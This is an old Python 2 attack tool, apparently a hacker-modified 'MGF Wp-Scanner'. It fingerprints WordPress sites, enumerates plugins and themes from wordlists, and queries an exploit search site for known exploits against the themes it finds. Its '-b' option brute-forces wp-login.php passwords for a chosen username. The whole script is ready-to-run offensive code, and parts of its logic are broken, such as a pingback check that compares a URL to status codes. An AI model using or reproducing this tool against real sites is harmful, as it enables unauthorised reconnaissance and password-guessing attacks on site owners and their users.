#!/usr/bin/python
########################################
# Coded by d3hydr8[at]gmail[dot]com    #
#   Modified by dogo h@ck(MGF15)       #
#        MGF Wp-Scanner         ______ #
#                              |_v2.8_|#
########################################

import sys, urllib2, re, time, httplib , os , colorama , urllib , socket 
from colorama import Fore, Back, Style , init

colorama.init()

def osfunction():
    if os.name == "posix":
        clearing = 'clear'
    else:
        clearing = 'cls'
    os.system(clearing)
d="\t[+] Found "
h="[+] Done !"
e="[+] Scanning: "
Dir = os.path.dirname(os.path.realpath(__file__)) + os.path.sep
dogo=open(Dir + 'ch.txt', 'w')
osfunction()
def print_intro():
    print "+------------------------------------------+"
    print "|          Coded by d3hydr8                |"
    print "|        modified by dogo h@ck - (MGF15)   |"
    print "|            MGF Wp-Scanner          ______|"
    print "|                                   |_v2.8_|"
    print "+------------------------------------------+"


BAD_RESP = [200,400,401,404]

def main(path):
	
	try:
		h = httplib.HTTP(host.split("/",1)[0])
		h.putrequest("HEAD", "/"+host.split("/",1)[1]+path)
		h.putheader("Host", host.split("/",1)[0])
		h.endheaders()
		resp, reason, headers = h.getreply()
		return resp, reason, headers.get("Server")
	except(), msg: 
		print "Error Occurred:",msg
		pass

def timer():
	now = time.localtime(time.time())
	return time.asctime(now)

if len(sys.argv) != 3:
	print "\nUsage: python MGF.py <option> <site> "
	print "Ex: python MGF.py -p http://www.site.com/\n"
	print "option:"
	print "\t-p : to scan plugins"
	print "\t-t : to scan themes"
	print "\t-b : to bruteforce "
	sys.exit(1)

option   = sys.argv[1]

host = sys.argv[2].replace("http://","").rsplit("/",1)[0]
if host[-1] != "/":
	host = host+"/"
site = sys.argv[2].replace("http://","").rsplit("/",2)[0]

print_intro()
print (Fore.WHITE + "\n[+] Started:"),timer()

print "\n[+] Site:",host
print (Fore.CYAN + "\n[+] Host IP:"),socket.gethostbyname(site )
server = main("/")[2]
print (Fore.YELLOW + '\n[+] Server:'),server


rest = site + '/xmlrpc.php'
try:
	if rest not in BAD_RESP: 
		print (Fore.RED + "\n[+] X-Pingback: " + 'http://'+rest)
	
except :
	print (Fore.RED + "\n[-] X-Pingback: " + ':(')
try :
	site = sys.argv[2]
	ret = site + '/readme.html'
	response = urllib2.urlopen(ret)
	html = response.read()
	M = re.findall("(Version \w+.\w+)", html) 
	N = re.findall("(Version \w+.\w+.\w+)", html)
	if N:
		print (Fore.GREEN + '\n[+]' ' This site use wordpress =>') ,N[0]
	elif M:
		print (Fore.GREEN + '\n[+]' ' This site use wordpress =>') ,M[0]
	else:
		print (Fore.GREEN + '\n[+]' + 'This site use wordpress =>' + Fore.GREEN + 'Unknown')
except:
	pass

opener = urllib2.build_opener()
opener.addheaders = [('User-agent', 'Mozilla/5.0')]
response = opener.open(site)

html = response.read()
match= re.findall(r"(/wp-content/themes/.*?/)", html)

if match :
		print (Fore.YELLOW + "\n[+] Wordpres Theme"), match[2]
else :
	pass
if option == '-p':
	print (Fore.WHITE + "\n" + e + 'plugins')
	Dir = os.path.dirname(os.path.realpath(__file__)) + os.path.sep
	pluginsFile = open(Dir + 'plugins.txt', 'r')
	try :
		for line in pluginsFile.read().split('\n'):
			resp,reason,server = main('/wp-content/plugins/' + line )
			if resp not in BAD_RESP:
				print (Fore.GREEN + d )
				print (Fore.GREEN + '\t/wp-content/plugins/'+ line)
				dogo.write(line+"\n")
	except :
			pass
				
elif option == '-t':
	print (Fore.WHITE + "\n" + e + 'themes')
	Dir = os.path.dirname(os.path.realpath(__file__)) + os.path.sep
	pluginsFile = open(Dir + 'themes.txt', 'r')
	for line in pluginsFile.read().split('\n'):
		resp,reason,server = main('/wp-content/themes/' + line)
		if resp not in BAD_RESP:
			print (Fore.GREEN + d )
			print (Fore.GREEN + '\t/wp-content/themes/'+ line)
			try :
				search='http://exploitsearch.net/index.php?q='
				b=line
				rest=(search+b)
				page=urllib2.urlopen(rest)
				page = page.read()
				links = re.findall(r'"((http)://www.*?/exploits/.*?)"', page)
				for link in links:
					print(Fore.YELLOW +'\t[+] Check: %s' % (link[0]))
			except :
				print (Fore.GREEN + '\t/wp-content/themes/'+ line)
			
elif option == '-b':
	site = sys.argv[2]
	print '\n=========================================='
	print '[+] Start BruteForce'
	user=raw_input('[*] Enter username :')
	bad='<strong>ERROR</strong>'
	currentDir = os.path.dirname(os.path.realpath(__file__)) + os.path.sep
	wordlistFile = open(currentDir + 'wordlist.txt', 'r')
	for passwd in wordlistFile.read().split('\n'):
		rest = '/wp-login.php'
		pa = urllib.urlencode({'log':user,'pwd':passwd})
		req  = urllib2.Request(site+rest)
		try:
			b   = urllib2.urlopen(req, pa)
			data = b.read()
			match= re.search('(<strong>ERROR</strong>)', data)
			sys.stdout.write("\r[*] Trying %s... " % passwd)
			if match: 
				pass
			else: 
				print '\n[+] Password Found: %s' % passwd 
				sys.exit(1)
		except urllib2.URLError:  
			print '[-] Error: seems to be down' 
		
print (Fore.WHITE + h)
